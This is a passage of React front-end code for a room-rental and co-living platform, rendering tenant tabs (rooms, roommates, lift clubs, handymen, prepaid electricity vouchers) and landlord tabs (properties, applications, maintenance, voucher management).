                              className="btn-gold" 
                              style={applyBtnStyle}
                              onClick={() => {
                                if (currentUser.role === 'visitor') {
                                  setAlertNotification('Guest mode restriction: Please register or log in to request a room!')
                                  setTimeout(() => setAlertNotification(null), 4000)
                                  return
                                }
                                setActiveListing(item)
                                setApplyMessage(`Hello ${item.landlordName}, I am interested in renting your room. Please review my profile requirements!`)
                              }}
                            >
                              {currentUser.role === 'visitor' ? 'Locked (Guest)' : 'Request Room'}
                            </button>
                          </div>
                        </motion.div>
                      ))
                    ) : (
                      <div style={emptyStateStyle}>No rooms found matching your active filters.</div>
                    )}
                  </div>
                </div>
              )}

              {/* TAB 2: Roommate Seeker matchmaking (P2P Tenant Network) */}
              {tenantTab === 'roommates' && (
                <div>
                  <div className="glass-panel" style={filterPanelStyle}>
                    <div style={filterRowStyle}>
                      <div style={filterFieldStyle}>
                        <label style={filterLabelStyle}>Gender Search</label>
                        <select 
                          value={roommateSearchGender} 
                          onChange={(e) => setRoommateSearchGender(e.target.value as 'all' | 'men' | 'women')}
                          style={filterSelectStyle}
                        >
                          <option value="all">All Roommates</option>
                          <option value="men">Male Seekers</option>
                          <option value="women">Female Seekers</option>
                        </select>
                      </div>

                      <div style={filterFieldStyle}>
                        <label style={filterLabelStyle}>Max Share Budget: {roommateSearchBudget} ZAR/GBP</label>
                        <input 
                          type="range" 
                          min={300} 
                          max={2500} 
                          step={50}
                          value={roommateSearchBudget}
                          onChange={(e) => setRoommateSearchBudget(parseInt(e.target.value))}
                          style={sliderStyle}
                        />
                      </div>
                    </div>
                  </div>

                  <div style={gridStyle}>
                    {filteredRoommates.map(rm => (
                      <div key={rm.id} className="glass-panel" style={cardStyle}>
                        <div style={cardBodyStyle}>
                          <div style={roommateTitleRowStyle}>
                            <h3 style={cardTitleStyle}>{rm.name}</h3>
                            <span style={priceTagLabelStyle}>{rm.budget} {rm.currency}/mo</span>
                          </div>
                          <p style={cardLocationStyle}><MapPin size={12} style={{ marginRight: 4 }} /> {rm.suburb}, {rm.location}</p>
                          <p style={cardDescStyle}>&quot;{rm.bio}&quot;</p>
                          <div style={chipsWrapperStyle}>
                            <span style={chipStyle}>Gender: {rm.gender.toUpperCase()}</span>
                            <span style={chipStyle}>Kids: {rm.childrenCount}</span>
                          </div>
                          <button 
                            className="btn-gold" 
                            style={applyBtnStyle}
                            onClick={() => {
                              if (currentUser.role === 'visitor') {
                                setAlertNotification('Guest mode restriction: Please register or log in to send chat invites!')
                                setTimeout(() => setAlertNotification(null), 4000)
                                return
                              }
                              handleMessageRoommate(rm.name)
                            }}
                          >
                            {currentUser.role === 'visitor' ? 'Locked (Guest)' : 'Send Chat Invitation'}
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* TAB 3: Lift Clubs pool board (P2P Tenant Network) */}
              {tenantTab === 'lifts' && (
                <div style={liftClubContainerStyle}>
                  {lifts.map(lift => (
                    <div key={lift.id} className="glass-panel" style={liftRowCardStyle}>
                      <div style={liftDetailsColStyle}>
                        <div style={liftHeaderStyle}>
                          <h4 style={liftDriverTitleStyle}>{lift.driverName}</h4>
                          <span style={liftPriceBadgeStyle}>{lift.pricePerSeat} {lift.currency} / seat</span>
                        </div>
                        <p style={liftRouteStyle}><MapPin size={14} style={{ marginRight: 6 }} /> <strong>From:</strong> {lift.origin} ➔ <strong>To:</strong> {lift.destination}</p>
                        <div style={liftTimeBlockStyle}>
                          <span style={liftBadgeStyle}><Clock size={12} style={{ marginRight: 4 }} /> {lift.departureTime}</span>
                          <span style={liftBadgeStyle}><Calendar size={12} style={{ marginRight: 4 }} /> {lift.days}</span>
                          <span style={liftBadgeStyle}><Users size={12} style={{ marginRight: 4 }} /> {lift.availableSeats} of {lift.totalSeats} seats left</span>
                        </div>
                      </div>
                      
                      <button 
                        className="btn-gold"
                        style={liftBookBtnStyle}
                        disabled={lift.availableSeats === 0}
                        onClick={() => {
                          if (currentUser.role === 'visitor') {
                            setAlertNotification('Guest mode restriction: Please register or log in to book seats!')
                            setTimeout(() => setAlertNotification(null), 4000)
                            return
                          }
                          handleBookSeat(lift.id, lift.driverName)
                        }}
                      >
                        {currentUser.role === 'visitor' ? 'Locked (Guest)' : (lift.availableSeats > 0 ? 'Request Ride Seat' : 'Fully Booked')}
                      </button>
                    </div>
                  ))}
                </div>
              )}

              {/* TAB 4: Tenant Handymen Services Directory (P2B / B2P) */}
              {tenantTab === 'handymen' && (
                <div>
                  <div style={landlordHeaderRowStyle}>
                    <div>
                      <h2 style={sectionHeaderStyle}>Local Skills & Services Directory</h2>
                      <p style={{ ...p2pDescStyle, margin: '0.2rem 0 0 0', color: '#888' }}>
                        Hire verified local plumbers, electricians, materials suppliers, bakkies, or packers to assist with moving and combat local unemployment.
                      </p>
                    </div>
                    {(() => {
                      const myBiz = services.find(s => s.ownerId === currentUser.id)
                      if (myBiz) {
                        return (
                          <button 
                            className="btn-gold" 
                            style={{ borderStyle: 'dashed' }}
                            onClick={() => handleDeleteBusiness(myBiz.id)}
                          >
                            Remove My Business Card
                          </button>
                        )
                      }
                      return (
                        <button 
                          className="btn-gold" 
                          onClick={() => {
                            if (currentUser.role === 'visitor') {
                              setAlertNotification('Guest mode restriction: Please register or log in to list a business!')
                              setTimeout(() => setAlertNotification(null), 4000)
                              return
                            }
                            setShowBusinessRegModal(true)
                          }}
                        >
                          <Plus size={14} style={{ marginRight: 6 }} /> Register My Skills / Business
                        </button>
                      )
                    })()}
                  </div>

                  <div style={{ ...gridStyle, marginTop: '1.5rem' }}>
                    {services.map(srv => (
                      <div key={srv.id} className="glass-panel" style={cardStyle}>
                        <div style={cardImageWrapperStyle}>
                          <img src={srv.image} alt={srv.businessName} style={cardImageStyle} />
                          <span style={priceTagStyle}>{srv.priceEstimate}</span>
                        </div>
                        <div style={cardBodyStyle}>
                          <div style={roommateTitleRowStyle}>
                            <h3 style={cardTitleStyle}>{srv.businessName}</h3>
                            <span style={serviceRatingBadgeStyle}>
                              <Star size={10} style={{ marginRight: 4, fill: '#D4AF37', color: '#D4AF37' }} /> 
                              {srv.rating} <span style={{ color: '#888', fontSize: '0.75rem', marginLeft: 4 }}>({srv.reviewsCount})</span>
                            </span>
                          </div>
                          <p style={cardLocationStyle}><MapPin size={12} style={{ marginRight: 4 }} /> {srv.suburb}, {srv.location}</p>
                          <p style={cardDescStyle}>{srv.description}</p>
                          <div style={chipsWrapperStyle}>
                            <span style={chipStyle}>Category: {srv.category}</span>
                            <span style={chipStyle}>Contact: {srv.contactNumber}</span>
                          </div>
                          
                          {srv.websiteUrl && (
                            <a href={srv.websiteUrl} target="_blank" rel="noopener noreferrer" style={bizWebLinkStyle}>
                              Visit Website (External)
                            </a>
                          )}

                          {srv.ownerId === currentUser.id ? (
                            <button 
                              className="btn-primary" 
                              style={{ ...applyBtnStyle, opacity: 0.6, cursor: 'default' }}
                              disabled
                            >
                              My Business Card
                            </button>
                          ) : (
                            <button 
                              className="btn-primary" 
                              style={applyBtnStyle}
                              onClick={() => {
                                if (currentUser.role === 'visitor') {
                                  setAlertNotification('Guest mode restriction: Please register or log in to dispatch contracts!')
                                  setTimeout(() => setAlertNotification(null), 4000)
                                  return
                                }
                                setSelectedBiz(srv)
                                setShowHireModal(true)
                              }}
                            >
                              {currentUser.role === 'visitor' ? 'Locked (Guest)' : 'Hire / Dispatch Contract'}
                            </button>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Outgoing & Incoming Dispatches tracker */}
                  <div style={{ marginTop: '3rem', borderTop: '1px dashed rgba(255,255,255,0.1)', paddingTop: '2rem' }}>
                    <h3 style={{ ...sectionHeaderStyle, marginBottom: '1.5rem' }}><Briefcase size={16} style={{ marginRight: 8 }} /> Local Service Contract Dispatch Logs</h3>
                    <div style={gridStyle}>
                      
                      {/* Outgoing dispatches sent by current user */}
                      <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px' }}>
                        <h4 style={{ color: '#D4AF37', marginBottom: '1rem', fontSize: '0.95rem', fontWeight: 'bold' }}>Contracts I Dispatched (Hiring)</h4>
                        {dispatches.filter(d => d.senderId === currentUser.id).length > 0 ? (
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                            {dispatches.filter(d => d.senderId === currentUser.id).map(disp => (
                              <div key={disp.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '0.8rem', borderRadius: '6px' }}>
                                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.4rem' }}>
                                  <strong>{disp.serviceName}</strong>
                                  <span style={badgeStyleStyle(disp.status)}>{disp.status.toUpperCase()}</span>
                                </div>
                                <p style={{ fontSize: '0.8rem', color: '#bbb', margin: '0 0 0.4rem 0' }}>&quot;{disp.message}&quot;</p>
                                <span style={{ fontSize: '0.75rem', color: '#888' }}>Sent: {disp.timestamp}</span>
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div style={emptyStateStyle}>No contracts dispatched yet. Hire a local helper above!</div>
                        )}
                      </div>

                      {/* Incoming dispatches for the user's business */}
                      {(() => {
                        const myBiz = services.find(s => s.ownerId === currentUser.id)
                        if (!myBiz) return (
                          <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                            <p style={{ color: '#888', fontSize: '0.85rem', textAlign: 'center', margin: '0 0 1rem 0' }}>Advertise your skills or services to unlock your incoming bookings dashboard!</p>
                            <button className="btn-gold" style={{ padding: '0.5rem 1rem', fontSize: '0.8rem' }} onClick={() => {
                              if (currentUser.role === 'visitor') {
                                  setAlertNotification('Guest mode restriction: Please register or log in to advertise!')
                                  setTimeout(() => setAlertNotification(null), 4000)
                                  return
                                }
                              setShowBusinessRegModal(true)
                            }}>Advertise My Skills</button>
                          </div>
                        )
                        
                        const myIncoming = dispatches.filter(d => d.serviceId === myBiz.id)
                        return (
                          <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px' }}>
                            <h4 style={{ color: '#D4AF37', marginBottom: '1rem', fontSize: '0.95rem', fontWeight: 'bold' }}>Incoming Bookings for: {myBiz.businessName}</h4>
                            {myIncoming.length > 0 ? (
                              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                                {myIncoming.map(disp => (
                                  <div key={disp.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '0.8rem', borderRadius: '6px' }}>
                                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.4rem' }}>
                                      <strong>From: {disp.senderName} ({disp.senderRole.toUpperCase()})</strong>
                                      <span style={badgeStyleStyle(disp.status)}>{disp.status.toUpperCase()}</span>
                                    </div>
                                    <p style={{ fontSize: '0.8rem', color: '#bbb', margin: '0 0 0.6rem 0' }}>&quot;{disp.message}&quot;</p>
                                    <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                                      {disp.status === 'pending' && (
                                        <button className="btn-primary" style={{ padding: '0.25rem 0.6rem', fontSize: '0.75rem' }} onClick={() => handleUpdateDispatchStatus(disp.id, 'accepted')}>Accept Order</button>
                                      )}
                                      {disp.status === 'accepted' && (
                                        <button className="btn-gold" style={{ padding: '0.25rem 0.6rem', fontSize: '0.75rem' }} onClick={() => handleUpdateDispatchStatus(disp.id, 'completed')}>Mark Completed</button>
                                      )}
                                      <span style={{ fontSize: '0.75rem', color: '#888', marginLeft: 'auto' }}>Received: {disp.timestamp}</span>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            ) : (
                              <div style={emptyStateStyle}>No active bookings received yet. Your card is visible in the directory.</div>
                            )}
                          </div>
                        )
                      })()}

                    </div>
                  </div>
                </div>
              )}

              {/* TAB 5: Prepaid Utilities (Tenant P2B/P2P Sharing) */}
              {tenantTab === 'utilities' && (
                <div>
                  <div style={landlordHeaderRowStyle}>
                    <div>
                      <h2 style={sectionHeaderStyle}>Prepaid Sub-meter Utility Marketplace</h2>
                      <p style={{ ...p2pDescStyle, margin: '0.2rem 0 0 0', color: '#888' }}>
                        Buy prepaid electricity sub-meter vouchers listed by landlords using your wallet balance.
                      </p>
                    </div>
                    <div style={walletBalanceDisplayStyle}>
                      <span style={{ fontSize: '0.7rem', color: '#aaa', textTransform: 'uppercase', display: 'block', marginBottom: '2px' }}>My Wallet Balance</span>
                      <strong style={{ fontSize: '1.2rem', color: '#D4AF37' }}>{currentUser.balance} ZAR</strong>
                    </div>
                  </div>

                  {/* Available vouchers */}
                  <h3 style={{ ...panelTitleStyle, marginTop: '2rem' }}>Available Utility Vouchers</h3>
                  <div style={gridStyle}>
                    {utilityTokens.filter(t => t.status === 'available').length > 0 ? (
                      utilityTokens.filter(t => t.status === 'available').map(token => (
                        <div key={token.id} className="glass-panel" style={cardStyle}>
                          <div style={{ ...cardBodyStyle, gap: '0.6rem' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                              <h4 style={{ margin: 0, fontSize: '0.95rem', color: '#fff' }}>Prepaid Electricity</h4>
                              <span style={{ color: '#D4AF37', fontWeight: 'bold', fontSize: '1.1rem' }}>{token.price} ZAR</span>
                            </div>
                            <p style={{ margin: 0, fontSize: '0.8rem', color: '#bbb' }}>
                              <strong>Meter No:</strong> {token.meterNumber}
                            </p>
                            <p style={{ margin: 0, fontSize: '0.8rem', color: '#888' }}>
                              <strong>Seller:</strong> {token.landlordName}
                            </p>
                            <button 
                              className="btn-gold" 
                              style={{ ...applyBtnStyle, marginTop: '0.5rem' }}
                              onClick={() => handleBuyUtilityToken(token)}
                            >
                              Buy Voucher
                            </button>
                          </div>
                        </div>
                      ))
                    ) : (
                      <div style={emptyStateStyle}>No electricity vouchers are currently available for purchase.</div>
                    )}
                  </div>

                  {/* Purchased history */}
                  <h3 style={{ ...panelTitleStyle, marginTop: '3rem' }}>My Purchased Vouchers</h3>
                  <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '12px' }}>
                    {utilityTokens.filter(t => t.purchasedBy === currentUser.id).length > 0 ? (
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                        {utilityTokens.filter(t => t.purchasedBy === currentUser.id).map(token => (
                          <div key={token.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '1rem', borderRadius: '8px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '1rem' }}>
                            <div>
                              <div style={{ display: 'flex', gap: '0.8rem', alignItems: 'center', marginBottom: '0.3rem' }}>
                                <strong style={{ color: '#fff', fontSize: '0.9rem' }}>Meter: {token.meterNumber}</strong>
                                <span style={{ background: 'rgba(34,197,94,0.15)', border: '1px solid #22c55e', color: '#22c55e', fontSize: '0.65rem', borderRadius: '4px', padding: '0.1rem 0.4rem' }}>ACTIVE</span>
                              </div>
                              <p style={{ margin: 0, fontSize: '0.75rem', color: '#aaa' }}>Bought from {token.landlordName} on {token.purchasedAt}</p>
                              <div style={{ marginTop: '0.5rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
                                <span style={{ fontSize: '0.85rem', fontFamily: 'monospace', color: '#D4AF37', background: 'rgba(212,175,55,0.08)', padding: '0.2rem 0.5rem', borderRadius: '4px', border: '1px dashed rgba(212,175,55,0.2)' }}>
                                  {token.tokenCode}
                                </span>
                                <button 
                                  onClick={() => {
                                    navigator.clipboard.writeText(token.tokenCode)
                                    setAlertNotification('Voucher code copied to clipboard!')
                                    setTimeout(() => setAlertNotification(null), 3000)
                                  }}
                                  style={{ background: 'transparent', border: 'none', color: '#aaa', cursor: 'pointer', display: 'flex', alignItems: 'center' }}
                                  title="Copy Code"
                                >
                                  <Copy size={14} />
                                </button>
                              </div>
                            </div>
                            <div style={{ textAlign: 'right' }}>
                              <strong style={{ color: '#fff' }}>{token.price} ZAR</strong>
                            </div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div style={emptyStateStyle}>You have not purchased any prepaid electricity vouchers yet.</div>
                    )}
                  </div>
                </div>
              )}

            </div>
          ) : (
            /* ================= LANDLORD WORKSPACE ================= */
            <div>
              {/* Workspace Navigation Tabs */}
              <div style={tabHeaderContainerStyle}>
                <button 
                  style={landlordTab === 'portfolio' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setLandlordTab('portfolio')}
                >
                  <Home size={14} style={{ marginRight: 6 }} /> My Properties
                </button>
                <button 
                  style={landlordTab === 'requests' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setLandlordTab('requests')}
                >
                  <FileText size={14} style={{ marginRight: 6 }} /> Applications Received ({landlordRequests.filter(r => r.status === 'pending').length})
                </button>
                <button 
                  style={landlordTab === 'maintenance' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setLandlordTab('maintenance')}
                >
                  <Briefcase size={14} style={{ marginRight: 6 }} /> B2B Maintenance Network
                </button>
                <button 
                  style={landlordTab === 'utilities' ? activeTabBtnStyle : inactiveTabBtnStyle}
                  onClick={() => setLandlordTab('utilities')}
                >
                  <Zap size={14} style={{ marginRight: 6 }} /> Manage Utilities
                </button>
              </div>

              {/* TAB 1: Properties Portfolio */}
              {landlordTab === 'portfolio' && (
                <div>
                  <div style={landlordHeaderRowStyle}>
                    <h2 style={sectionHeaderStyle}>Active Room Listings</h2>
                    <button className="btn-gold" onClick={() => setShowCreateModal(true)}>
                      <Plus size={16} style={{ marginRight: 8 }} /> List a New Room
                    </button>
                  </div>

                  <div style={gridStyle}>
                    {listings.filter(l => l.landlordId === currentUser.id).length > 0 ? (
                      listings.filter(l => l.landlordId === currentUser.id).map(item => (
                        <div key={item.id} className="glass-panel" style={cardStyle}>
                          <div style={cardImageWrapperStyle}>
                            <img src={item.images[0]} alt={item.title} style={cardImageStyle} />
                            <span style={priceTagStyle}>{item.price} {item.currency}/mo</span>
                          </div>
                          
                          <div style={cardBodyStyle}>
                            <h3 style={cardTitleStyle}>{item.title}</h3>
                            <p style={cardLocationStyle}>
                              <MapPin size={12} style={{ marginRight: 4 }} /> {item.suburb}, {item.location}
                            </p>
                            
                            <div style={requirementsBoxStyle}>
                              <p style={reqHeaderStyle}>Set Requirements & Preferences:</p>
                              <ul style={reqListStyle}>
                                <li>WiFi: {item.amenities.wifi ? 'Yes' : 'No'} | Parking: {item.amenities.parking ? 'Yes' : 'No'}</li>
                                <li>Bathroom: {item.amenities.bathroom.toUpperCase()}</li>
                                <li>Gender: {item.requirements.genderPreference.toUpperCase()}</li>
                                <li>Kids Allowed: {item.requirements.childrenAllowed ? `Max ${item.requirements.maxChildren}` : 'No'}</li>
                              </ul>
                            </div>
                          </div>
                        </div>
                      ))
                    ) : (
                      <div style={emptyStateStyle}>No listed rooms. Click &quot;List a New Room&quot; to add properties.</div>
                    )}
                  </div>
                </div>
              )}

              {/* TAB 2: Applications Received Management */}
              {landlordTab === 'requests' && (
                <div className="glass-panel" style={requestManagerPanelStyle}>
                  <h3 style={panelTitleStyle}>Applications Awaiting Audit</h3>
                  <div style={requestTableStyle}>
                    {landlordRequests.length > 0 ? (
                      landlordRequests.map(req => (
                        <div key={req.id} style={reqRowStyle}>
                          <div style={reqSummaryStyle}>
                            <p style={reqTitleStyle}>{req.tenantName} wants to rent</p>
                            <p style={reqSubTitleStyle}>{req.listingTitle}</p>
                            <p style={reqMsgStyle}>"{req.message}"</p>
                          </div>
                          
                          <div style={reqActionsStyle}>
                            <span style={badgeStyleStyle(req.status)}>{req.status.toUpperCase()}</span>
                            {req.status === 'pending' && (
                              <button 
                                className="btn-primary" 
                                style={verifyBtnStyle}
                                onClick={() => setActiveRequest(req)}
                              >
                                <Eye size={12} style={{ marginRight: 6 }} /> Audit Profile Criteria
                              </button>
                            )}
                          </div>
                        </div>
                      ))
                    ) : (
                      <div style={emptyStateStyle}>No tenant applications received yet.</div>
                    )}
                  </div>
                </div>
              )}

              {/* TAB 3: B2B Handyman Maintenance Directory */}
              {landlordTab === 'maintenance' && (
                <div>
                  <div style={landlordHeaderRowStyle}>
                    <div>
                      <h2 style={sectionHeaderStyle}>B2B Co-Living Maintenance Network</h2>
                      <p style={{ ...p2pDescStyle, margin: '0.2rem 0 0 0', color: '#888' }}>
                        Hire trusted suppliers, bakkies, transport systems, packers, or contractors to maintain your properties or assist with operations.
                      </p>
                    </div>
                    {(() => {
                      const myBiz = services.find(s => s.ownerId === currentUser.id)
                      if (myBiz) {
                        return (
                          <button 
                            className="btn-gold" 
                            style={{ borderStyle: 'dashed' }}
                            onClick={() => handleDeleteBusiness(myBiz.id)}
                          >
                            Remove My Business Card
                          </button>
                        )
                      }
                      return (
                        <button 
                          className="btn-gold" 
                          onClick={() => {
                            if (currentUser.role === 'visitor') {
                              setAlertNotification('Guest mode restriction: Please register or log in to list a business!')
                              setTimeout(() => setAlertNotification(null), 4000)
                              return
                            }
                            setShowBusinessRegModal(true)
                          }}
                        >
                          <Plus size={14} style={{ marginRight: 6 }} /> Register My Skills / Business
                        </button>
                      )
                    })()}
                  </div>

                  <div style={{ ...gridStyle, marginTop: '1.5rem' }}>
                    {services.map(srv => (
                      <div key={srv.id} className="glass-panel" style={cardStyle}>
                        <div style={cardImageWrapperStyle}>
                          <img src={srv.image} alt={srv.businessName} style={cardImageStyle} />
                          <span style={priceTagStyle}>{srv.priceEstimate}</span>
                        </div>
                        <div style={cardBodyStyle}>
                          <div style={roommateTitleRowStyle}>
                            <h3 style={cardTitleStyle}>{srv.businessName}</h3>
                            <span style={serviceRatingBadgeStyle}>
                              <Star size={10} style={{ marginRight: 4, fill: '#D4AF37', color: '#D4AF37' }} /> 
                              {srv.rating} <span style={{ color: '#888', fontSize: '0.75rem', marginLeft: 4 }}>({srv.reviewsCount})</span>
                            </span>
                          </div>
                          <p style={cardLocationStyle}><MapPin size={12} style={{ marginRight: 4 }} /> {srv.suburb}, {srv.location}</p>
                          <p style={cardDescStyle}>{srv.description}</p>
                          <div style={chipsWrapperStyle}>
                            <span style={chipStyle}>Category: {srv.category}</span>
                            <span style={chipStyle}>Contact: {srv.contactNumber}</span>
                          </div>
                          
                          {srv.websiteUrl && (
                            <a href={srv.websiteUrl} target="_blank" rel="noopener noreferrer" style={bizWebLinkStyle}>
                              Visit Website (External)
                            </a>
                          )}

                          {srv.ownerId === currentUser.id ? (
                            <button 
                              className="btn-primary" 
                              style={{ ...applyBtnStyle, opacity: 0.6, cursor: 'default' }}
                              disabled
                            >
                              My Business Card
                            </button>
                          ) : (
                            <button 
                              className="btn-primary" 
                              style={applyBtnStyle}
                              onClick={() => {
                                if (currentUser.role === 'visitor') {
                                  setAlertNotification('Guest mode restriction: Please register or log in to dispatch contracts!')
                                  setTimeout(() => setAlertNotification(null), 4000)
                                  return
                                }
                                setSelectedBiz(srv)
                                setShowHireModal(true)
                              }}
                            >
                              {currentUser.role === 'visitor' ? 'Locked (Guest)' : 'Hire / Dispatch Contract'}
                            </button>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Outgoing & Incoming Dispatches tracker */}
                  <div style={{ marginTop: '3rem', borderTop: '1px dashed rgba(255,255,255,0.1)', paddingTop: '2rem' }}>
                    <h3 style={{ ...sectionHeaderStyle, marginBottom: '1.5rem' }}><Briefcase size={16} style={{ marginRight: 8 }} /> Local Service Contract Dispatch Logs</h3>
                    <div style={gridStyle}>
                      
                      {/* Outgoing dispatches sent by current user */}
                      <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px' }}>
                        <h4 style={{ color: '#D4AF37', marginBottom: '1rem', fontSize: '0.95rem', fontWeight: 'bold' }}>Contracts I Dispatched (Hiring)</h4>
                        {dispatches.filter(d => d.senderId === currentUser.id).length > 0 ? (
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                            {dispatches.filter(d => d.senderId === currentUser.id).map(disp => (
                              <div key={disp.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '0.8rem', borderRadius: '6px' }}>
                                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.4rem' }}>
                                  <strong>{disp.serviceName}</strong>
                                  <span style={badgeStyleStyle(disp.status)}>{disp.status.toUpperCase()}</span>
                                </div>
                                <p style={{ fontSize: '0.8rem', color: '#bbb', margin: '0 0 0.4rem 0' }}>"{disp.message}"</p>
                                <span style={{ fontSize: '0.75rem', color: '#888' }}>Sent: {disp.timestamp}</span>
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div style={emptyStateStyle}>No contracts dispatched yet. Hire a local helper above!</div>
                        )}
                      </div>

                      {/* Incoming dispatches for the user's business */}
                      {(() => {
                        const myBiz = services.find(s => s.ownerId === currentUser.id)
                        if (!myBiz) return (
                          <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                            <p style={{ color: '#888', fontSize: '0.85rem', textAlign: 'center', margin: '0 0 1rem 0' }}>Advertise your skills or services to unlock your incoming bookings dashboard!</p>
                            <button className="btn-gold" style={{ padding: '0.5rem 1rem', fontSize: '0.8rem' }} onClick={() => {
                              if (currentUser.role === 'visitor') {
                                  setAlertNotification('Guest mode restriction: Please register or log in to advertise!')
                                  setTimeout(() => setAlertNotification(null), 4000)
                                  return
                                }
                              setShowBusinessRegModal(true)
                            }}>Advertise My Skills</button>
                          </div>
                        )
                        
                        const myIncoming = dispatches.filter(d => d.serviceId === myBiz.id)
                        return (
                          <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '8px' }}>
                            <h4 style={{ color: '#D4AF37', marginBottom: '1rem', fontSize: '0.95rem', fontWeight: 'bold' }}>Incoming Bookings for: {myBiz.businessName}</h4>
                            {myIncoming.length > 0 ? (
                              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
                                {myIncoming.map(disp => (
                                  <div key={disp.id} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', padding: '0.8rem', borderRadius: '6px' }}>
                                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.4rem' }}>
                                      <strong>From: {disp.senderName} ({disp.senderRole.toUpperCase()})</strong>
                                      <span style={badgeStyleStyle(disp.status)}>{disp.status.toUpperCase()}</span>
                                    </div>
                                    <p style={{ fontSize: '0.8rem', color: '#bbb', margin: '0 0 0.6rem 0' }}>"{disp.message}"</p>
                                    <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                                      {disp.status === 'pending' && (
                                        <button className="btn-primary" style={{ padding: '0.25rem 0.6rem', fontSize: '0.75rem' }} onClick={() => handleUpdateDispatchStatus(disp.id, 'accepted')}>Accept Order</button>
                                      )}
                                      {disp.status === 'accepted' && (
                                        <button className="btn-gold" style={{ padding: '0.25rem 0.6rem', fontSize: '0.75rem' }} onClick={() => handleUpdateDispatchStatus(disp.id, 'completed')}>Mark Completed</button>
                                      )}
                                      <span style={{ fontSize: '0.75rem', color: '#888', marginLeft: 'auto' }}>Received: {disp.timestamp}</span>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            ) : (
                              <div style={emptyStateStyle}>No active bookings received yet. Your card is visible in the directory.</div>
                            )}
                          </div>
                        )
                      })()}

                    </div>
                  </div>
                </div>
              )}

              {/* TAB 4: Prepaid Utilities (Landlord P2B/P2P Sharing) */}
              {landlordTab === 'utilities' && (
                <div>
                  <div style={landlordHeaderRowStyle}>
                    <div>
                      <h2 style={sectionHeaderStyle}>Manage Prepaid Utility Vouchers</h2>
                      <p style={{ ...p2pDescStyle, margin: '0.2rem 0 0 0', color: '#888' }}>
                        Generate and manage 20-digit prepaid electricity vouchers for your tenant sub-meters.
                      </p>
                    </div>
                  </div>

                  <div style={{ ...gridStyle, gridTemplateColumns: '1.2fr 1.8fr', gap: '2rem', marginTop: '1.5rem' }}>
                    
                    {/* Left Form: Create Token */}
                    <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '12px' }}>
                      <h3 style={{ ...panelTitleStyle, borderBottom: 'none', marginBottom: '1rem' }}>Create Prepaid Voucher</h3>
                      <form onSubmit={handleCreateUtilityToken} style={formStyleStyle}>
                        <div style={inputGroupStyle}>
                          <label style={labelStyleStyle}>Sub-Meter Number</label>
                          <input 
                            type="text" 
                            required 
                            placeholder="e.g. MTR-4592-1102" 
                            value={utilityMeter}
                            onChange={(e) => setUtilityMeter(e.target.value)}
                            style={modalInputStyle}
                          />
                        </div>

                        <div style={inputGroupStyle}>
                          <label style={labelStyleStyle}>Voucher Price (ZAR)</label>
                          <input 
                            type="number" 
                            required 
                            min={10}
                            value={utilityPrice}
                            onChange={(e) => setUtilityPrice(parseInt(e.target.value) || 0)}
                            style={modalInputStyle}
                          />
                        </div>

                        <div style={inputGroupStyle}>
                          <label style={labelStyleStyle}>20-Digit Recharge Code</label>
                          <input 
                            type="text" 
                            required 
                            placeholder="e.g. 4820-2910-3849-5029-1123" 
                            value={utilityCode}
                            onChange={(e) => setUtilityCode(e.target.value)}
                            style={modalInputStyle}
                          />
                          <span style={{ fontSize: '0.65rem', color: '#888' }}>Must be exactly 20 digits. Separate blocks with hyphens.</span>
                        </div>

                        <button 
                          type="submit" 
                          className="btn-gold" 
                          style={{ ...modalSubmitBtnStyle, marginTop: '0.8rem' }}
                        >
                          Generate & Publish Voucher
                        </button>
                      </form>
                    </div>

                    {/* Right List: Voucher Logs */}
                    <div className="glass-panel" style={{ padding: '1.5rem', borderRadius: '12px' }}>
                      <h3 style={{ ...panelTitleStyle, borderBottom: 'none', marginBottom: '1rem' }}>My Generated Vouchers</h3>
                      
                      {utilityTokens.filter(t => t.landlordId === currentUser.id).length > 0 ? (
